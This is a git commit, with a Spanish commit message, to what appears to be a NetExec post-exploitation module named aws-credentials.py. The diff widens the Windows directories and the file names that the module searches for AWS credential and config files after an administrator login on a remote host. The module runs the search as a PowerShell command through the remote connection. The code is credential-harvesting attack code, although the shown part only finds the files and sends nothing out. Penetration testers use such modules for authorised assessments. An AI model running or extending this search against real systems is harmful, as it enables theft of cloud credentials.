8e9c651cfc6de023b70d0e4cfcbb4fe11ed8ea17
Brian Giraldo <fortress@Anakin.dark.local>
2024-10-15 21:15:21 -0500

    se adicionan rutas por defecto donde buscar y nombres de archivos.

--- aws-credentials.py
+++ aws-credentials.py
@@ -15,13 +15,13 @@ class NXCModule:
     multiple_hosts = True
 
     def __init__(self):
-        self.search_path = "'C:\\Users\\'"
+        self.search_path = "'C:\\Users\\', 'C:\\ProgramData\\AWSCLI\\', 'C:\\Temp\\'"
 
     def options(self, context, module_options):
         r"""
         SEARCH_PATH     Comma-separated locations where to search for aws credentials related files 
                         (you must add single quotes around the paths if they include spaces)
-                        Default: 'C:\\Users\\'
+                        Default: 'C:\\Users\\ - C:\\ProgramData\\AWSCLI\\ - C:\\Temp\\'
         """
         if "SEARCH_PATH" in module_options:
             self.search_path = module_options["SEARCH_PATH"]
@@ -29,7 +29,7 @@ class NXCModule:
     def on_admin_login(self, context, connection):
 
         # search for aws_credentials-related files
-        search_aws_creds_files_payload = f"Get-ChildItem -Path {self.search_path} -Recurse -Force -Include ('credentials','credentials.bk') -ErrorAction SilentlyContinue | Select FullName -ExpandProperty FullName"
+        search_aws_creds_files_payload = f"Get-ChildItem -Path {self.search_path} -Recurse -Force -Include ('credentials','credentials.bk','config','config.bk') -ErrorAction SilentlyContinue | Select FullName -ExpandProperty FullName"
         search_aws_creds_files_cmd = f'powershell.exe "{search_aws_creds_files_payload}"'
         search_aws_creds_files_output = connection.execute(search_aws_creds_files_cmd, True)
     
